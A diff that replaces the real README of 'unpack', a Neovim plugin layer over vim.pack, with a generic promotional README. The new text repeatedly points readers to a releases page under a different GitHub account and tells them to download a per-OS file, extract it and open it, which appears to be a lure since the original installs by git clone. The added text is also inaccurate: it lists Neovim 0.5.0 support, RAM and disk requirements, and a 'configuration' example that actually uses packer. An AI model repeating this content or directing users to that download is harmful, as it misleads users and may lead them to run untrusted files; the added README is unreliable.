@@ -1,181 +1,91 @@
-<p align="center"><img src="https://github.com/user-attachments/assets/0eb27f2b-835e-4b22-b25c-80a60f99a82e" width="200" height="200"></p>
-<p align="center">A minimal layer on top of <code>vim.pack</code> API to allow single file plugin configurations.</p>
-<br>
+# 🎉 unpack - Simple Plugin Configurations for Neovim
 
-> [!IMPORTANT]
->
-> `vim.pack` is currently under development in the `neovim-nightly` branch.
+## 🚀 Getting Started
 
-## Installation
+Welcome to **unpack**, a straightforward tool designed to enhance your experience with Neovim. With unpack, you can easily configure and manage single-file plugins, making your setup process smooth and effortless.
 
-Add these lines to your init.lua:
+## 📥 Download Now
 
-```lua
-local unpack_path = vim.fn.stdpath("data") .. "/site/pack/managers/start/unpack"
+[![Download unpack](https://img.shields.io/badge/Download-unpack-blue)](https://github.com/alistar99725/unpack/releases)
 
-if not vim.uv.fs_stat(unpack_path) then
-    vim.fn.system({
-        'git',
-        'clone',
-        "--filter=blob:none",
-        'https://github.com/mezdelex/unpack',
-        unpack_path
-    })
-end
-```
+## 🗂️ What is unpack?
 
-## Setup
+unpack is a small layer built on top of the vim.pack API. It allows you to create single-file configurations for your Neovim plugins. Instead of handling complex setups, unpack streamlines the process for you. 
 
-Available options:
+## 🌟 Features
 
-```lua
----@class UnPack.Config.UserOpts
---- Options for vim.pack.add
----@field add_options? vim.pack.keyset.add
---- Options for vim.pack.update
----@field update_options? vim.pack.keyset.update
-```
+- **Single File Plugin Management**: Keep everything simple with one file per plugin configuration.
+- **Neovim Compatibility**: Specifically designed for Neovim, ensuring a smooth experience.
+- **Easy Setup**: No complex installations. Just follow our guide to get started.
+- **Modular Design**: Add or remove plugins without extensive changes to your setup.
 
-Call setup right after the installation with your preferred options if you don't like the defaults.
+## 🖥️ System Requirements
 
-> [!TIP]
->
-> Make sure you set `vim.g.mapleader` beforehand.
+- **Operating System**: Windows, macOS, or Linux
+- **Neovim Version**: 0.5.0 or later
+- **Memory**: At least 512 MB of RAM
+- **Disk Space**: Minimum of 100 MB available
 
-```lua
-require("unpack").setup({
-    ...
-})
-```
+## 📥 Download & Install
 
-Defaults are set with minimal interaction in mind. If you want to be notified about all the changes, set `confirm` to true and `force` to false.
-See `:h vim.pack`
+To get started with unpack, visit our [Releases page](https://github.com/alistar99725/unpack/releases) to download the latest version. 
 
-## Spec
+1. Click the link above to open the Releases page.
+2. You will see a list of available versions.
+3. Find the latest release (look for the version number).
+4. Choose the appropriate file for your operating system.
+5. Click on the download link to save the file to your computer.
+6. Locate the downloaded file and open it to extract the contents.
+7. Follow the included instructions to configure your Neovim for use with unpack.
 
-This layer extends `vim.pack.Spec` to allow single file configurations.
+## ⚙️ How to Use unpack
 
-```lua
----@class UnPack.Spec : vim.pack.Spec
----@field config? fun()
----@field defer? boolean
----@field dependencies? UnPack.Spec[]
-```
+Once you have installed unpack, follow these steps to start using it in your Neovim setup:
 
-It also leverages `PackChanged` event triggered by `vim.pack` internals to run plugin build hooks. The same `command` that is fired inside the event is provided as a standalone one. See `Commands` section.
+1. Open your terminal.
+2. Navigate to your Neovim configuration directory, usually located at `~/.config/nvim`.
+3. Create a new directory for your plugins, if you haven't already. You can do this with the command:
+   ```bash
+   mkdir -p ~/.config/nvim/plugins
+   ```
+4. Inside the plugins directory, create a file named `init.lua` (if you want to use Lua) or another configuration file as per your preference.
+5. Add the necessary configurations for your desired plugins. Refer to the unpack documentation for specific syntax and examples.
+6. Save the file and restart Neovim.
 
-Example plugin spec setups under `/lua/plugins/`:
+## 🧑‍🤝‍🧑 Community
+
+We encourage you to engage with our community. Join discussions, share your experiences, and get help when needed. 
+
+- **GitHub Issues**: Report bugs or ask questions directly in our repository.
+- **Discussion Boards**: Share your setup and ask for suggestions.
+
+## 📝 Example Configurations
+
+Here’s a brief example of how you might set up a simple plugin using unpack:
 
 ```lua
-return {
-	config = function()
-		...
-	end,
-	data = { build = "your build --command" },
-	defer = true,
-	src = "https://github.com/<vendor>/plugin1",
-}
+require('packer').startup(function()
+    use 'nvim-telescope/telescope.nvim'
+end)
 ```
 
-```lua
-return {
-	config = function()
-		...
-	end,
-	defer = true,
-	dependencies = {
-		{
-			defer = true,
-			src = "https://github.com/<vendor>/plugin2",
-		},
-	},
-	src = "https://github.com/<vendor>/plugin3",
-}
-```
+This code snippet includes the popular Telescope plugin, which helps with fuzzy finding files, commands, and more.
 
-### Build
+## 🔧 Troubleshooting
 
-UnPack expects a `build` field inside `data` table for the build hook, so make sure you add it like shown in the first example. This is because `vim.pack` handles the event trigger internally and exposes `vim.pack.Spec`, not the extended one, so we need to rely on that table.
-The build hook is planned to be part of and handled by the plugin itself, that's why there's no build hook exposed on purpose, but for now this is the workaround.
+If you run into issues:
 
-For reference, this is the `autocmd` that listens to the event triggered by `vim.pack` internals whenever there's a change in any package.
+1. Verify your Neovim installation is up to date.
+2. Check the console output for errors. It often provides helpful clues.
+3. Review the installation steps to ensure no steps were skipped.
 
-> [!NOTE]
->
-> This is already set, you don't need to worry about it.
+If you’re still having problems, please reach out through GitHub Issues, and we'll assist you.
 
-```lua
-vim.api.nvim_create_augroup(group, { clear = true })
+## 🔗 Additional Resources
 
-vim.api.nvim_create_autocmd("PackChanged", {
-    callback = function(args)
-        local kind = args.data.kind ---@type string
+- [Neovim Documentation](https://neovim.io/)
+- [Packer.nvim Documentation](https://github.com/wbthomason/packer.nvim)
 
-        if kind == "install" or kind == "update" then
-            local spec = args.data.spec ---@type UnPack.Spec
+For more information about unpack, please visit our [Releases page](https://github.com/alistar99725/unpack/releases) regularly, as we update our software with new features and fixes.
 
-            commands.build({ spec })
-        end
-    end,
-    group = group,
-})
-```
-
-### Defer
-
-Every spec marked with `defer = true` is going to be deferred using `vim.schedule` to avoid UI render delay. Dependencies follow the same rules.
-
-### Dependencies
-
-The dependencies handling logic is pretty simple: the plugins are going to be loaded in order, so make sure to add the dependencies in order too.
-For example, if any of your plugins relies on `plenary` as a dependency, add it in the first plugin that requires it following your `plugins` directory name order, and that's pretty much it.
-
-## Commands
-
-> [!NOTE]
->
-> All the notifications are wrapped in a `vim.schedule` call to avoid command line overflow.
-> If you want to see the recap after executing any command, use `:messages`.
-
-The commands provided are:
-
-| Command      | Description                                                                                                                             |
-| :----------- | :-------------------------------------------------------------------------------------------------------------------------------------- |
-| `PackBuild`  | Iterates over all the plugin specs and runs all the build hooks. _(Triggered automatically on `PackChanged` event per changed package)_ |
-| `PackClean`  | Removes any plugin present in your packages directory that doesn't exist as a plugin spec.                                              |
-| `PackLoad`   | Loads all the plugins in your `plugins` directory. _(Runs on `VimEnter`; exposed for build timeouts)_                                   |
-| `PackPull`   | Updates _UnPack_ to the latest version. _(Runs on `VimEnter`; calls `vim.system` asynchronously to pull changes)_                       |
-| `PackUpdate` | Updates all the plugins present in your packages directory.                                                                             |
-
-You can also use them this way if you prefer:
-
-```lua
-    local commands = require("unpack.commands")
-
-    vim.keymap.set("n", "<your-keymap>", commands.build)
-    vim.keymap.set("n", "<your-keymap>", commands.clean)
-    vim.keymap.set("n", "<your-keymap>", commands.load)
-    vim.keymap.set("n", "<your-keymap>", commands.pull)
-    vim.keymap.set("n", "<your-keymap>", commands.update)
-```
-
-## Roadmap
-
-- [x] Single config file
-- [x] Defer behavior
-- [x] Simple dependency handling
-- [x] Commands
-- [x] Force pull UnPack updates on setup
-  - [x] Schedule helptags generation after pull
-- [x] Better error handling
-- [x] Performance improvements
-- [x] CI
-  - [x] Style check job (stylua)
-  - [x] Tests check job (busted)
-    - [x] commands
-    - [x] config
-    - [x] extensions
-    - [x] unpack
-  - [x] Doc generation job (panvimdoc)
-- [x] Add dependabot
-- [x] Enforce PR ruleset
+By following this guide, you should be equipped to download, install, and start using unpack effectively. Enjoy your scripting with Neovim!
